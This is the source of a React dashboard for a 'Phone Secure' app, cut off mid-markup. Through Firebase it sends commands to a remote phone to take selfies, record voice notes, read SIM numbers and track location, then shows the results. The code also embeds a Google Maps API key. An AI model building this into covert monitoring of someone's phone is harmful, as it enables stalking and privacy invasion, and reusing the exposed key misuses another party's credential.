import React, { useEffect, useState, useRef } from "react";
import type { ReactElement } from "react";
import { database } from '../firebase/config';
import { ref, push, set, onValue, off } from 'firebase/database';

// Server Commands as a union type and object
export const ServerCommands = {
  TakeSelfie: 'TakeSelfie',
  GetVoiceNote: 'GetVoiceNote',
  GetSimNumbers: 'GetSimNumbers',
  GetLocation: 'GetLocation',
  GetLocationTimeline: 'GetLocationTimeline',
  SendNotification: 'SendNotification',
} as const;
export type ServerCommands = typeof ServerCommands[keyof typeof ServerCommands];

// Message Status as a union type and object
export const MessageStatus = {
  BEFORE_UPLOADED: 'BEFORE_UPLOADED',
  UPLOADED: 'UPLOADED',
  DELIVERED: 'DELIVERED',
} as const;
export type MessageStatus = typeof MessageStatus[keyof typeof MessageStatus];
const STATUS = MessageStatus; // alias for brevity

// Helper to detect Firebase Storage media URLs
function isFirebaseUrl(url: string): boolean {
  if (!url || typeof url !== 'string') return false;
  return url.includes('firebasestorage.googleapis.com');
}

function isFirebaseVoiceUrl(url: string): boolean {
  if (!isFirebaseUrl(url)) return false;
  // More permissive detection for voice notes
  return (url.includes('/recordings/') || url.includes('recording_')) && url.includes('.mp3');
}

function isFirebaseImageUrl(url: string): boolean {
  if (!isFirebaseUrl(url)) return false;
  // More permissive detection for images
  return (url.includes('/selfies/') || url.includes('photo_') || url.includes('image_') || url.includes('selfie_')) && 
         (url.includes('.jpg') || url.includes('.jpeg') || url.includes('.png'));
}

// Helper to detect Google Maps URLs and extract coordinates
const extractMapCoordinates = (url: string): { lat: string, lng: string } | null => {
  if (!url || typeof url !== 'string') return null;
  
  try {
    // Check if it's a Google Maps URL with coordinates
    if (url.includes('google.com/maps') && url.includes('q=')) {
      // Extract the coordinates part after q=
      const match = url.match(/q=([\d.-]+),([\d.-]+)/);
      if (match && match.length === 3) {
        return {
          lat: match[1],
          lng: match[2]
        };
      }
    }
    return null;
  } catch (error) {
    console.error('Error extracting coordinates:', error);
    return null;
  }
};

// Helper to check if a string contains multiple coordinates for a path
const extractPathCoordinates = (text: string): { lat: string, lng: string }[] | null => {
  if (!text || typeof text !== 'string') return null;
  
  try {
    // Look for a pattern of multiple coordinates in the text
    // Format could be like: "Path: 31.0310335,74.2599316|31.0410335,74.2699316|31.0510335,74.2799316"
    if (text.includes('Path:')) {
      const pathMatch = text.match(/Path:\s*(.+)/);
      if (pathMatch && pathMatch[1]) {
        const coordsText = pathMatch[1].trim();
        const coordPairs = coordsText.split('|');
        
        if (coordPairs.length >= 2) { // Need at least 2 points for a path
          const coordinates = coordPairs.map(pair => {
            const [lat, lng] = pair.split(',');
            if (lat && lng) {
              return { lat: lat.trim(), lng: lng.trim() };
            }
            return null;
          }).filter(coord => coord !== null);
          
          if (coordinates.length >= 2) {
            return coordinates as { lat: string, lng: string }[];
          }
        }
      }
    }
    return null;
  } catch (error) {
    console.error('Error extracting path coordinates:', error);
    return null;
  }
};

// Image component for Firebase images
const FirebaseImage: React.FC<{ url: string }> = ({ url }) => {
  const [isExpanded, setIsExpanded] = React.useState(false);
  
  return (
    <div className="mt-2">
      <div 
        className={`rounded-lg overflow-hidden ${isExpanded ? 'max-w-full' : 'max-w-[200px]'} cursor-pointer transition-all duration-300`}
        onClick={() => setIsExpanded(!isExpanded)}
      >
        <img 
          src={url} 
          alt="Received image" 
          className="w-full h-auto object-contain shadow-md" 
          loading="lazy"
          onError={(e) => {
            // If image fails to load, show error message
            const target = e.target as HTMLImageElement;
            target.onerror = null;
            target.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiPjxwYXRoIGQ9Ik05IDIyaDE0YTEgMSAwIDAgMCAxLTFWMyBhMSAxIDAgMCAwLTEtMUg1YTEgMSAwIDAgMC0xIDF2MThhMSAxIDAgMCAwIDEgMXptMS0yVjRoMTJ2MTZINnoiLz48cGF0aCBkPSJNMTMgOGwtMyAzLTIgLTIgLTMgM3Y0aDEweiIvPjxjaXJjbGUgY3g9IjE1IiBjeT0iNiIgcj0iMSIvPjwvc3ZnPg==';
          }}
        />
      </div>
      <div className="text-xs text-gray-500 mt-1 flex items-center">
        <svg className="w-3 h-3 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
        </svg>
        Photo {isExpanded ? '(tap to shrink)' : '(tap to expand)'}
      </div>
    </div>
  );
};

// WhatsApp-style voice note player
const VoiceNotePlayer: React.FC<{ url: string }> = ({ url }) => {
  const [playing, setPlaying] = React.useState(false);
  const [progress, setProgress] = React.useState(0);
  const [duration, setDuration] = React.useState(0);
  const [currentTime, setCurrentTime] = React.useState(0);
  const audioRef = React.useRef<HTMLAudioElement | null>(null);

  React.useEffect(() => {
    const audio = audioRef.current;
    if (!audio) return;
    const onTimeUpdate = () => {
      setCurrentTime(audio.currentTime);
      setProgress(audio.duration ? (audio.currentTime / audio.duration) * 100 : 0);
    };
    const onLoadedMetadata = () => setDuration(audio.duration);
    audio.addEventListener('timeupdate', onTimeUpdate);
    audio.addEventListener('loadedmetadata', onLoadedMetadata);
    return () => {
      audio.removeEventListener('timeupdate', onTimeUpdate);
      audio.removeEventListener('loadedmetadata', onLoadedMetadata);
    };
  }, []);

  const togglePlay = () => {
    const audio = audioRef.current;
    if (!audio) return;
    if (playing) {
      audio.pause();
      setPlaying(false);
    } else {
      audio.play();
      setPlaying(true);
    }
  };
  const onEnded = () => setPlaying(false);

  // Generate a simple waveform visualization
  const generateWaveform = () => {
    const bars = [];
    const barCount = 30;
    
    for (let i = 0; i < barCount; i++) {
      // Create a pattern that's higher in the middle
      const height = Math.sin((i / barCount) * Math.PI) * 100;
      const heightPercent = 30 + height * 0.4; // Scale between 30% and 70%
      
      // Determine if the bar should be highlighted based on progress
      const isActive = (i / barCount) * 100 <= progress;
      
      bars.push(
        <div 
          key={i}
          className={`w-[2px] mx-[1px] rounded-full ${isActive ? 'bg-green-500' : 'bg-gray-300'}`}
          style={{ height: `${heightPercent}%` }}
        />
      );
    }
    
    return bars;
  };

  return (
    <div className="mt-2 w-full max-w-[240px]">
      <div className="flex items-center gap-2 bg-gray-50 rounded-lg px-3 py-3 shadow-sm border border-gray-100">
        <button
          className="focus:outline-none bg-green-500 rounded-full w-8 h-8 flex items-center justify-center flex-shrink-0"
          onClick={togglePlay}
          aria-label={playing ? 'Pause' : 'Play'}
        >
          {playing ? (
            <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24"><rect x="6" y="5" width="4" height="14"/><rect x="14" y="5" width="4" height="14"/></svg>
          ) : (
            <svg className="w-4 h-4 text-white ml-0.5" fill="currentColor" viewBox="0 0 24 24"><polygon points="5,3 19,12 5,21"/></svg>
          )}
        </button>
        
        <div className="flex-1">
          <audio
            ref={audioRef}
            src={url}
            onEnded={onEnded}
            preload="metadata"
            className="hidden"
          />
          
          {/* Waveform visualization with click-to-seek */}
          <div 
            className="w-full h-8 flex items-center cursor-pointer"
            onClick={(e) => {
              const audio = audioRef.current;
              if (!audio) return;
              
              // Calculate click position as percentage of width
              const rect = e.currentTarget.getBoundingClientRect();
              const clickX = e.clientX - rect.left;
              const percentage = clickX / rect.width;
              
              // Set audio position based on click
              audio.currentTime = percentage * audio.duration;
              
              // If not playing, start playing
              if (!playing) {
                audio.play();
                setPlaying(true);
              }
            }}
          >
            {generateWaveform()}
          </div>
          
          <div className="flex justify-between text-[10px] text-gray-500 mt-1">
            <span>{formatTime(currentTime)}</span>
            <span>{formatTime(duration)}</span>
          </div>
        </div>
      </div>
      
      <div className="text-xs text-gray-500 mt-1 flex items-center">
        <svg className="w-3 h-3 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z" />
        </svg>
        Voice Message
      </div>
    </div>
  );
};

function formatTime(sec: number): string {
  if (!sec || isNaN(sec)) return '0:00';
  const m = Math.floor(sec / 60);
  const s = Math.floor(sec % 60);
  return `${m}:${s.toString().padStart(2, '0')}`;
}

// Map Preview component for Google Maps links
const MapPreview: React.FC<{ 
  url: string, 
  coordinates: { lat: string, lng: string },
  pathCoordinates?: { lat: string, lng: string }[] 
}> = ({ url, coordinates, pathCoordinates }) => {
  // Determine if we're showing a single point or a path
  const isPath = pathCoordinates && pathCoordinates.length >= 2;
  
  // Build the appropriate Google Maps embed URL
  let mapSrc = '';
  
  if (isPath) {
    // For a path, use the directions mode
    const origin = `${pathCoordinates[0].lat},${pathCoordinates[0].lng}`;
    const destination = `${pathCoordinates[pathCoordinates.length-1].lat},${pathCoordinates[pathCoordinates.length-1].lng}`;
    
    // Add waypoints if there are more than 2 points
    let waypoints = '';
    if (pathCoordinates.length > 2) {
      waypoints = '&waypoints=' + pathCoordinates.slice(1, -1)
        .map(coord => `${coord.lat},${coord.lng}`)
        .join('|');
    }
    
    mapSrc = `https://www.google.com/maps/embed/v1/directions?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&origin=${origin}&destination=${destination}${waypoints}&mode=driving`;
  } else {
    // For a single point, use place mode
    mapSrc = `https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=${coordinates.lat},${coordinates.lng}&zoom=14`;
  }
  
  return (
    <div className="w-full">
      <div className="border border-gray-200 rounded-lg overflow-hidden shadow-sm">
        <iframe 
          width="100%" 
          height="250" 
          frameBorder="0" 
          src={mapSrc}
          allowFullScreen
          className="w-full"
        ></iframe>
        <div className="p-2 bg-white border-t border-gray-200">
          <a 
            href={url} 
            target="_blank" 
            rel="noopener noreferrer" 
            className="text-blue-500 hover:text-blue-700 text-sm font-medium flex items-center"
          >
            <svg className="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
            </svg>
            {isPath ? 'View Route in Google Maps' : 'Open in Google Maps'}
          </a>
          <div className="mt-1 text-xs text-gray-500">
            {isPath ? (
              <span>Route with {pathCoordinates.length} points</span>
            ) : (
              <span>Location: {coordinates.lat}, {coordinates.lng}</span>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

// Top Menu Bar component
const TopMenuBar: React.FC<{ 
  toggleDeviceInfo: () => void,
  toggleMobileMenu: () => void
}> = ({ toggleDeviceInfo, toggleMobileMenu }) => (
  <div className="fixed top-0 left-0 w-full z-20 bg-gradient-to-r from-blue-50 via-white to-blue-100 shadow-lg flex justify-center transition-all">
    <div className="w-full max-w-5xl flex items-center justify-between px-4 sm:px-6 py-3">
      <div className="flex items-center gap-2 sm:gap-3">
        <img src="/phonesecure_logo.jpeg" alt="Logo" className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12 rounded-full shadow" />
        <span className="text-lg sm:text-xl md:text-2xl font-extrabold text-blue-800 tracking-tight drop-shadow">Phone Secure</span>
      </div>
      <div className="flex items-center gap-2 sm:gap-4">
        <a href="#support" className="hidden sm:block text-gray-600 hover:text-blue-600 font-medium transition">Support</a>
        <a href="#contact" className="hidden sm:block text-gray-600 hover:text-blue-600 font-medium transition">Contact Us</a>
        <button className="hidden sm:block text-gray-500 hover:text-blue-600 transition" title="Share App Link">
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2} stroke="currentColor" className="w-6 h-6">
            <path strokeLinecap="round" strokeLinejoin="round" d="M15 8a3 3 0 11-6 0 3 3 0 016 0zm6 8a3 3 0 11-6 0 3 3 0 016 0zm-6 0a3 3 0 11-6 0 3 3 0 016 0zm-6 0a3 3 0 11-6 0 3 3 0 016 0z" />
          </svg>
        </button>
        {/* Social Media Icons - hidden on very small screens */}
        <a href="https://twitter.com" target="_blank" rel="noopener noreferrer" className="hidden xs:block text-gray-400 hover:text-blue-500 transition" title="Twitter">
          <svg viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5"><path d="M22.46 6c-.77.35-1.6.58-2.47.69a4.26 4.26 0 0 0 1.88-2.36 8.48 8.48 0 0 1-2.7 1.03A4.24 4.24 0 0 0 16.11 4c-2.34 0-4.23 1.9-4.23 4.24 0 .33.04.66.1.97C7.69 9.07 4.07 7.13 1.64 4.15c-.36.62-.56 1.33-.56 2.1 0 1.45.74 2.73 1.87 3.48-.69-.02-1.33-.21-1.9-.52v.05c0 2.03 1.44 3.72 3.35 4.1-.35.1-.72.16-1.1.16-.27 0-.52-.03-.77-.07.53 1.65 2.04 2.85 3.84 2.88A8.52 8.52 0 0 1 2 19.54c-.26 0-.52-.02-.77-.05A12.01 12.01 0 0 0 8.29 21.5c7.55 0 11.69-6.26 11.69-11.69 0-.18 0-.36-.01-.54A8.18 8.18 0 0 0 24 5.1a8.33 8.33 0 0 1-2.54.7z"/></svg>
        </a>
        <a href="https://facebook.com" target="_blank" rel="noopener noreferrer" className="hidden xs:block text-gray-400 hover:text-blue-700 transition" title="Facebook">
          <svg viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5"><path d="M22.67 0H1.33C.6 0 0 .6 0 1.33v21.33C0 23.4.6 24 1.33 24h11.5v-9.29H9.69V11.1h3.14V8.41c0-3.1 1.89-4.79 4.66-4.79 1.33 0 2.47.1 2.8.14v3.24h-1.92c-1.5 0-1.79.71-1.79 1.75v2.29h3.58l-.47 3.61h-3.11V24h6.09c.73 0 1.33-.6 1.33-1.33V1.33C24 .6 23.4 0 22.67 0z"/></svg>
        </a>
        
        {/* Mobile Menu Button */}
        <button
          onClick={toggleMobileMenu}
          className="md:hidden text-gray-600 hover:text-blue-600 transition p-2"
          title="Menu"
        >
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6">
            <path strokeLinecap="round" strokeLinejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5" />
          </svg>
        </button>
        
        {/* Mobile Device Info Toggle */}
        <button
          onClick={toggleDeviceInfo}
          className="md:hidden text-gray-600 hover:text-blue-600 transition p-2 -mr-2"
          title="Device Info"
        >
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6">
            <path strokeLinecap="round" strokeLinejoin="round" d="M11.25 11.25l.041-.02a.75.75 0 011.063.852l-.708 2.836a.75.75 0 001.063.853l.041-.021M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9-3.75h.008v.008H12V8.25z" />
          </svg>
        </button>
      </div>
    </div>
  </div>
);

// Icon map for commands
const commandIcons: Record<string, ReactElement> = {
  "Get Location": <span className="mr-2 text-blue-600"><svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M12 11c1.104 0 2-.896 2-2s-.896-2-2-2-2 .896-2 2 .896 2 2 2zm0 10c-4.418 0-8-3.582-8-8 0-4.418 3.582-8 8-8s8 3.582 8 8c0 4.418-3.582 8-8 8zm0 0V3"/></svg></span>,
  "Take Selfie": <span className="mr-2 text-pink-500"><svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><rect width="20" height="14" x="2" y="5" rx="2"/><circle cx="12" cy="12" r="3"/></svg></span>,
  "Get Phone Numbers": <span className="mr-2 text-green-600"><svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M3 5a2 2 0 012-2h3.28a2 2 0 011.94 1.515l.518 2.073a2 2 0 01-.45 1.94l-1.07 1.07a16.001 16.001 0 006.586 6.586l1.07-1.07a2 2 0 011.94-.45l2.073.518A2 2 0 0121 17.72V21a2 2 0 01-2 2h-1C9.163 23 1 14.837 1 5V4a2 2 0 012-2z"/></svg></span>,
  "Get Voice Note": <span className="mr-2 text-yellow-500"><svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"/></svg></span>,
  "Get Sim Numbers": <span className="mr-2 text-teal-500"><svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><rect x="3" y="2" width="18" height="20" rx="2" ry="2"/><line x1="7" y1="7" x2="7" y2="7"/><line x1="7" y1="12" x2="7" y2="12"/><line x1="7" y1="17" x2="7" y2="17"/><line x1="12" y1="7" x2="17" y2="7"/><line x1="12" y1="12" x2="17" y2="12"/><line x1="12" y1="17" x2="17" y2="17"/></svg></span>,
  "Get Location Timeline": <span className="mr-2 text-indigo-600"><svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M12 8v4l3 3"/><circle cx="12" cy="12" r="10"/></svg></span>,
  "Lock Device": <span className="mr-2 text-gray-400"><svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><rect width="18" height="10" x="3" y="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg></span>,
  "Wipe Device": <span className="mr-2 text-red-600"><svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><rect width="18" height="10" x="3" y="11" rx="2"/><path d="M8 11V7a4 4 0 018 0v4"/></svg></span>,
  "Send Notification": <span className="mr-2 text-purple-500 relative"><svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"/></svg><span className="absolute -top-1 -right-1 w-2 h-2 bg-red-500 rounded-full"></span></span>,
};

const commands: { label: string; command: ServerCommands | null }[] = [
  { label: "Get Location", command: ServerCommands.GetLocation },
  { label: "Take Selfie", command: ServerCommands.TakeSelfie },
  { label: "Get Voice Note", command: ServerCommands.GetVoiceNote },
  { label: "Get Sim Numbers", command: ServerCommands.GetSimNumbers },
  { label: "Get Location Timeline", command: ServerCommands.GetLocationTimeline },
  { label: "Send Notification", command: ServerCommands.SendNotification }
];

const dummyDeviceInfo = {
  name: "Samsung Galaxy S21",
  battery: "82%",
  status: "Online",
  os: "Android 13",
  lastSeen: "2025-05-28 16:37",
  imei: "356789123456789",
  phoneNumber: "+1 234-567-8901",
  location: "New York, USA",
};

const Dashboard: React.FC = () => {
  // Mobile menu state
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  
  // Toggle mobile menu
  const toggleMobileMenu = () => {
    setIsMobileMenuOpen(!isMobileMenuOpen);
  };
  
  // Send command to Firebase
  const sendCommand = async (command: ServerCommands | null) => {
    if (!command) {
      return;
    }
    
    // IMPORTANT: Always use the hardcoded path regardless of login state
    const CHAT_PATH = 'chat/CQwxFfFywdaUMYQJ2fOTTwCOYTN2';
    
    try {
      const chatRef = ref(database, CHAT_PATH);
      const newMsgRef = push(chatRef);
      const pushKey = newMsgRef.key;
      console.log('[sendCommand] Firebase pushKey generated:', pushKey);

      // Set initial status to BEFORE_UPLOADED
      const chatMessage = {
        key: pushKey,
        command: command,
        commandTimestamp: Date.now(),
        status: MessageStatus.BEFORE_UPLOADED,
        // response, responseTimestamp, and updated status will be added by the device
      };
      console.log('[sendCommand] ChatMessage to be sent:', chatMessage);

      // Upload to Firebase
      await set(newMsgRef, chatMessage);
      // After upload, update status to UPLOADED
      await set(newMsgRef, { ...chatMessage, status: MessageStatus.UPLOADED });
      console.log('[sendCommand] ChatMessage status updated to UPLOADED');
    } catch (error) {
      console.error('Error sending command:', error);
    }
  };


  // Chat state
  interface ChatMessage {
    key: string;
    command: string;
    commandTimestamp: number;
    status: string;
    response?: string;
    responseTimestamp?: number;
    timestamp?: number;
  }
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const chatEndRef = useRef<HTMLDivElement | null>(null);
  const [isDeviceInfoOpenOnMobile, setIsDeviceInfoOpenOnMobile] = useState(false);
  // const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false); // Removed duplicate


  // Toggle command menu
  // Removed unused toggleCommandMenu to fix lint/build error
  // (function and body removed)


  // Handle command selection from mobile menu or bottom nav
  const handleCommandSelect = (command: ServerCommands | null) => {
    if (command) {
      sendCommand(command);
      // Command menu removed, so only close mobile menu
      setIsMobileMenuOpen(false);
    }
  };

  
  // Handle command selection from mobile menu
  const handleCommandClick = (command: ServerCommands | null) => {
    if (command) {
      sendCommand(command);
      setIsMobileMenuOpen(false); // Close mobile menu after selecting a command
    }
  };

  // Listen to chat in real time
  useEffect(() => {
    console.log('======= CHAT LOADING PROCESS STARTED =======');
    
    // IMPORTANT: Always load from the hardcoded path regardless of login state
    // This is the specific path where the messages are stored based on the JSON export
    const CHAT_PATH = 'chat/CQwxFfFywdaUMYQJ2fOTTwCOYTN2';
    console.log(`Loading chat from path: ${CHAT_PATH}`);
    
    const chatRef = ref(database, CHAT_PATH);
    
    // Handler for when data is received
    const handleValue = (snapshot: any) => {
      console.log('Received data from Firebase');
      const data = snapshot.val();
      
      if (!data) {
        console.log('No chat data found');
        setChatMessages([]);
        return;
      }
      
      console.log('Raw chat data received, number of messages:', Object.keys(data).length);
      
      try {
        // Convert Firebase object to array with Firebase keys as message keys
        const messages = Object.entries(data).map(([firebaseKey, msgData]: [string, any]) => {
          // If the message doesn't have a key property, add the Firebase key
          if (!msgData.key) {
            return { ...msgData, key: firebaseKey };
          }
          return msgData;
        });
        
        console.log(`Converted ${messages.length} messages to array format`);
        
        // Sort by commandTimestamp (fallback to timestamp for backward compatibility)
        const sortedMessages = messages.sort((a: any, b: any) => {
          const aTime = a.commandTimestamp || a.timestamp || 0;
          const bTime = b.commandTimestamp || b.timestamp || 0;
          return aTime - bTime;
        });
        
        console.log(`Setting ${sortedMessages.length} messages to state`);
        setChatMessages(sortedMessages);
      } catch (error) {
        console.error('Error processing chat data:', error);
        setChatMessages([]);
      }
    };
    
    // Set up the Firebase listener
    console.log('Setting up Firebase listener...');
    onValue(chatRef, handleValue);
    
    return () => {
      console.log('Cleaning up Firebase listener');
      off(chatRef, 'value');
    };
  }, []);

  // Auto-scroll to bottom
  useEffect(() => {
    if (chatEndRef.current) {
      chatEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [chatMessages]);


  return (
    <div className="min-h-screen flex flex-col">
      <TopMenuBar 
        toggleDeviceInfo={() => setIsDeviceInfoOpenOnMobile(!isDeviceInfoOpenOnMobile)} 
        toggleMobileMenu={toggleMobileMenu}
      />
      <div className="flex-1 flex flex-col md:flex-row bg-gray-100 pt-20 pb-16 md:pb-0">
        {/* Left Sidebar (Desktop Commands) */}
        <aside className="hidden md:flex w-64 bg-white/90 border-r flex-col py-8 px-4 shadow-md min-h-[calc(100vh-4rem)]">
          <h2 className="text-lg font-bold text-blue-700 mb-6 flex items-center gap-2">
            <svg className="w-6 h-6 text-blue-400" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4"/></svg>
            Commands
          </h2>
          <ul className="space-y-2">
            {commands.map(cmd => (
              <li key={cmd.label}>
                <button
                  className="w-full flex items-center gap-2 px-3 py-2 rounded-lg hover:bg-blue-50 font-medium text-gray-700 transition group shadow-sm"
                  onClick={() => sendCommand(cmd.command)}
                  disabled={!cmd.command}
                  style={{ opacity: cmd.command ? 1 : 0.5 }}
                >
                  {commandIcons[cmd.label]}
                  <span>{cmd.label}</span>
                </button>
              </li>
            ))}
          </ul>
        </aside>

        {/* Center Chat */}
        <main className="flex-1 w-full flex flex-col items-center bg-gradient-to-br from-slate-50 to-sky-100 overflow-y-auto px-4 py-6">
          {/* Chat Layout */}
          <div className="w-full max-w-2xl flex flex-col bg-gradient-to-b from-blue-50 via-white to-blue-100 shadow-xl rounded-2xl overflow-hidden border border-blue-100 h-[calc(100vh-120px)] md:h-[calc(100vh-60px)]">
            <div className="flex-1 p-6 overflow-y-auto space-y-4 bg-transparent custom-scrollbar">
              {chatMessages.map((msg) => (
                <div key={msg.key || msg.commandTimestamp || Math.random()} className="space-y-3 my-4">
                  {/* Command Part (Admin's message) */}
                  <div className="flex justify-end">
                    <div className="rounded-lg px-3 py-2 max-w-[80vw] md:max-w-[60vw] break-words whitespace-pre-wrap bg-blue-100 text-blue-900">
                      {msg.command}
                      <div className="flex items-center gap-1 justify-end mt-2 text-xs opacity-70">
                        {/* WhatsApp-style Status indicator for admin message */}
                        {msg.response ? (
                          <span className="inline-flex items-center mr-1">
                            <svg className="w-4 h-4 text-blue-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M1 13l4 4L15 7"/><path d="M5 17l4 4L23 7"/></svg>
                          </span>
                        ) : msg.status === STATUS.BEFORE_UPLOADED ? (
                          <span className="inline-flex items-center mr-1">
                            <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
                          </span>
                        ) : msg.status === STATUS.UPLOADED ? (
                          <span className="inline-flex items-center mr-1">
                            <svg className="w-4 h-4 text-gray-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M1 13l4 4L15 7"/></svg>
                          </span>
                        ) : msg.status === STATUS.DELIVERED ? (
                          <span className="inline-flex items-center mr-1">
                            <svg className="w-4 h-4 text-gray-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M1 13l4 4L15 7"/><path d="M5 17l4 4L23 7"/></svg>
                          </span>
                        ) : null}
                        <span>
                          {new Date(msg.commandTimestamp || msg.timestamp || Date.now()).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                        </span>
                      </div>
                    </div>
                  </div>
                  {/* Device response bubble (left-aligned, only if response exists) */}
                  {msg.response && (
                    <div className="flex justify-start mt-2">
                      <div className="bg-gray-100 text-gray-800 px-4 py-2 rounded-2xl max-w-xs shadow animate-in fade-in">
                        <div className="flex items-center gap-2">
                          {/* Media content: Voice note, Image, Map, Path, or Text */}
                          {isFirebaseVoiceUrl(msg.response) ? (
                            <VoiceNotePlayer url={msg.response} />
                          ) : isFirebaseImageUrl(msg.response) ? (
                            <FirebaseImage url={msg.response} />
                          ) : isFirebaseUrl(msg.response) ? (
                            <a href={msg.response} target="_blank" rel="noopener noreferrer" className="text-blue-500 underline">
                              View attachment
                            </a>
                          ) : extractPathCoordinates(msg.response) ? (
                            <MapPreview 
                              url={`https://www.google.com/maps/dir/${extractPathCoordinates(msg.response)!.map(coord => `${coord.lat},${coord.lng}`).join('/')}`} 
                              coordinates={extractPathCoordinates(msg.response)![0]} 
                              pathCoordinates={extractPathCoordinates(msg.response)!} 
                            />
                          ) : extractMapCoordinates(msg.response) ? (
                            <MapPreview url={msg.response} coordinates={extractMapCoordinates(msg.response)!} />
                          ) : (
                            <span className="whitespace-pre-wrap break-words">{msg.response}</span>
                          )}
                        </div>
                        <div className="flex items-center gap-1 justify-end mt-1 text-xs opacity-70">
                          <span>
                            {msg.responseTimestamp ? new Date(msg.responseTimestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : ''}
                          </span>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              ))}
              <div ref={chatEndRef} />
            </div>
            {/* Bottom Navigation for Mobile - All Commands as Icons */}
            <div className="md:hidden fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 flex items-center justify-between px-1 z-10 overflow-x-auto">
              {commands.map((cmd) => (
                <button
                  key={cmd.label}
                  onClick={() => handleCommandSelect(cmd.command)}
                  disabled={!cmd.command}
                  className={`flex flex-col items-center flex-1 p-2 ${cmd.command ? 'text-blue-600' : 'text-gray-400 opacity-50'} focus:outline-none`}
                  aria-label={cmd.label}
                  style={{ minWidth: 0 }}
                >
                  <span className="w-7 h-7 flex items-center justify-center">
                    {commandIcons[cmd.label]}
                  </span>
                  <span className="hidden xs:inline text-[10px] leading-tight mt-0.5 truncate max-w-[60px]">
                    {cmd.label}
                  </span>
                </button>
              ))}
              {/* Device Info Icon */}
              <button
                onClick={() => setIsDeviceInfoOpenOnMobile(true)}
                className="flex flex-col items-center flex-1 p-2 text-gray-600 hover:text-blue-600 focus:outline-none"
                aria-label="Device Info"
                style={{ minWidth: 0 }}
              >
                <span className="w-7 h-7 flex items-center justify-center">
